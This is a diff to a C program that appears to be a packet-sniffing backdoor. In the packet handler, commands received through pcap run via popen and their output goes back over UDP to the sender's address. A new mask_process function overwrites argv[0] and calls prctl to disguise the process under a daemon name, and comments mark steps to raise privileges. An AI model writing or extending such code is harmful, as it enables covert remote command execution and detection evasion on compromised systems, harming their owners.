@@ -76,6 +76,8 @@ int main(int argc, char **argv){
         }
     }
     
+    mask_process(argv, PROCESS_NAME);
+
     /* Validation then run client or server */
     
     if(is_server){
@@ -85,6 +87,7 @@ int main(int argc, char **argv){
         }
         else{
             server(s_opt);
+	    
         }
     }
     else{
@@ -147,7 +150,7 @@ void client(struct client_opt c_opt){
     memset(&server, 0, sizeof(struct sockaddr_in));
     memset(&client, 0, sizeof(struct sockaddr_in));
     
-    // Create socket with SO_REUSEADDR
+    // Create UDP socket
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     arg = 1;
     if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
@@ -186,6 +189,7 @@ void server(struct server_opt s_opt){
     printf("Running server...\n");
 
     /* Mask process name */
+    
     
     /* Raise privileges */
     
@@ -391,28 +395,43 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     
     /* Send results back to client */
     
+    // Open UDP socket
     int sockfd;
     struct sockaddr_in dst_host;
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     int arg = 1;
     if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
         system_fatal("setsockopt");
-        
+    
     memset(&dst_host, 0, sizeof(struct sockaddr_in));
     dst_host.sin_family = AF_INET;
     dst_host.sin_addr.s_addr = packet_info.ip->ip_src.s_addr;
     dst_host.sin_port = packet_info.tcp->th_sport;
     
+    // Send results from popen command
     char output[1024];
     memset(output, 0, 1024);
     fread((void *)output, sizeof(char), 1024, fp);
-    
     sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)&dst_host, sizeof(dst_host));
     
-    // Cleanup
+    /* Cleanup */
+    
     free(bd_command);
     close(sockfd);
     pclose(fp);
+}
+
+/*
+| ------------------------------------------------------------------------------
+| Mask process under daemon
+| ------------------------------------------------------------------------------
+*/
+
+void mask_process(char *argv[], char *name){
+    
+    memset(argv[0], 0, strlen(argv[0]));
+    strcpy(argv[0], name);
+    prctl(PR_SET_NAME, name, 0, 0);
 }
 
 /*
